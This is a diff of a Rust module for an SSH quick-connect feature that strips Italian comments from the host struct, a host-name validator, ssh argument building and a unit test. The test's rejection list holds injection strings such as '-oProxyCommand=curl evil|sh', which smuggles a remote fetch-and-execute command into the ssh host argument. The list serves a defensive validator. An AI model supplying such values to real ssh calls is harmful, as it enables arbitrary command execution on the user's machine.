@@ -1,8 +1,3 @@
-//! SSH quick-connect: host salvati su cui eseguire comandi non interattivi
-//! (uptime, df, riavvio servizi, docker ps…) con output in streaming come i
-//! task. Nessuna sessione interattiva: `ssh` viene lanciato in BatchMode, quindi
-//! serve accesso a chiave senza password (come per il Docker remoto ssh://).
-
 use rand::RngCore;
 use serde::{Deserialize, Serialize};
 
@@ -11,18 +6,13 @@ use serde::{Deserialize, Serialize};
 pub struct SshHost {
     pub id: String,
     pub name: String,
-    /// Destinazione ssh: "user@host", "host" o un alias di ~/.ssh/config.
     pub host: String,
-    /// Comando proposto di default nella UI (facoltativo).
     #[serde(default)]
     pub default_command: String,
 }
 
 pub const MAX_HOSTS: usize = 100;
 
-/// Destinazione ssh accettabile su riga di comando: non vuota, niente trattino
-/// iniziale (non deve sembrare un flag), solo i caratteri di user@host[:porta] o
-/// di un alias di ~/.ssh/config. Il comando remoto, invece, è libero.
 pub fn valid_host(s: &str) -> bool {
     !s.is_empty()
         && s.len() <= 255
@@ -54,9 +44,6 @@ pub fn new_id() -> String {
     format!("sh-{}-{}", crate::events::now_ms(), suffix)
 }
 
-/// Argomenti di `ssh` per eseguire `command` in modo non interattivo. BatchMode
-/// evita ogni prompt (fallisce subito se la chiave non basta), accept-new accetta
-/// la host key nuova senza bloccare (utile per VM ricreate).
 pub fn run_args(host: &str, command: &str) -> Vec<String> {
     vec![
         "-o".into(),
@@ -101,8 +88,6 @@ mod tests {
 
     #[test]
     fn valid_host_blocca_flag_e_command_injection() {
-        // Un host malevolo non deve poter diventare un flag di ssh né iniettare
-        // comandi/opzioni locali (ProxyCommand, separatori, sostituzioni…).
         for bad in [
             "-oProxyCommand=curl evil|sh",
             "-F/dev/null",
@@ -118,7 +103,6 @@ mod tests {
         ] {
             assert!(!valid_host(bad), "doveva rifiutare: {bad:?}");
         }
-        // Destinazioni legittime restano valide.
         for ok in ["user@host", "10.0.0.1", "vm.local:2222", "homelab", "user_1@host-2"] {
             assert!(valid_host(ok), "doveva accettare: {ok:?}");
         }
